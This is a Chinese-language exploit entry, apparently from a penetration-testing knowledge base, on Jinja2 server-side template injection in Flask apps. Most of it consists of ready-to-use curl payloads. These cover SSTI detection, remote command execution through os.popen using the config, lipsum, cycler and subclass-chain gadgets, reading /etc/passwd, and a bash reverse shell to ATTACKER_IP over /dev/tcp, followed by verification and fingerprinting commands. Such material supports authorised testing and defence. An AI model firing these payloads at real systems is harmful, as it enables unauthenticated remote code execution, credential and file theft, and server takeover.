---
id: FLASK-SSTI
title: Flask Jinja2 服务端模板注入漏洞 (SSTI)
product: flask
vendor: Pallets
version_affected: "all versions (code vulnerability)"
severity: CRITICAL
tags: [rce, ssti, 无需认证]
fingerprint: ["Flask", "Werkzeug", "Jinja2"]
---

## 漏洞描述

Flask 应用使用 Jinja2 模板引擎时，如果开发者将用户输入直接拼接到模板字符串中进行渲染（而非通过模板变量传递），攻击者可注入 Jinja2 模板语法（如 `{{7*7}}`），利用 Python 的内省机制访问内置函数和模块，最终执行任意系统命令。

## 影响版本

- 所有使用 Jinja2 且存在模板注入的 Flask 应用

## 前置条件

- 无需认证（取决于具体接口）
- 目标 Flask 应用存在将用户输入直接传入 `render_template_string()` 或模板拼接的代码
- 可通过 URL 参数、表单字段或其他输入点触发

## 利用步骤

1. 检测模板注入（发送 `{{7*7}}` 检查是否返回 49）
2. 利用 Python 类继承链获取内置函数
3. 通过 `os.popen()` 或 `subprocess` 执行系统命令
4. 获取命令输出或反弹 shell

## Payload

### 检测 SSTI

```bash
# 基本检测
curl -s "http://target:8000/?name={{7*7}}" | grep "49"

# 确认 Jinja2
curl -s "http://target:8000/?name={{config}}"
```

### 命令执行 — 通过 os.popen

```bash
curl -s "http://target:8000/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

### 命令执行 — 通过类继承链

```bash
# URL 编码版本（推荐）
curl -s "http://target:8000/?name=%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__()%25%7D%7B%25+if+c.__name__+%3D%3D+%27catch_warnings%27+%25%7D%7B%25+for+b+in+c.__init__.__globals__.values()%25%7D%7B%25+if+b.__class__+%3D%3D+%7B%7D.__class__+%25%7D%7B%25+if+%27eval%27+in+b.keys()%25%7D%7B%7Bb%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%7D%7D%7B%25+endif+%25%7D%7B%25+endif+%25%7D%7B%25+endfor+%25%7D%7B%25+endif+%25%7D%7B%25+endfor+%25%7D"
```

### 命令执行 — lipsum 全局变量（简洁）

```bash
curl -s "http://target:8000/?name={{lipsum.__globals__.os.popen('id').read()}}"
```

### 命令执行 — cycler 对象

```bash
curl -s "http://target:8000/?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
```

### 读取文件

```bash
curl -s "http://target:8000/?name={{config.__class__.__init__.__globals__['os'].popen('cat+/etc/passwd').read()}}"
```

### 反弹 shell

```bash
curl -s "http://target:8000/?name={{config.__class__.__init__.__globals__['os'].popen('bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261\"').read()}}"
```

## 验证方法

```bash
# 确认 SSTI 存在
curl -s "http://target:8000/?name={{7*7}}" | grep "49"

# 确认可执行命令
curl -s "http://target:8000/?name={{lipsum.__globals__.os.popen('id').read()}}" | grep "uid="
```

## 指纹确认

```bash
# Flask/Werkzeug 特征
curl -s -I http://target:8000/ | grep -i "Werkzeug\|Python"

# 触发 Flask 默认错误页
curl -s http://target:8000/nonexistent_page_12345 | grep -i "Werkzeug\|Flask"
```

## 参考链接

- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
- http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates
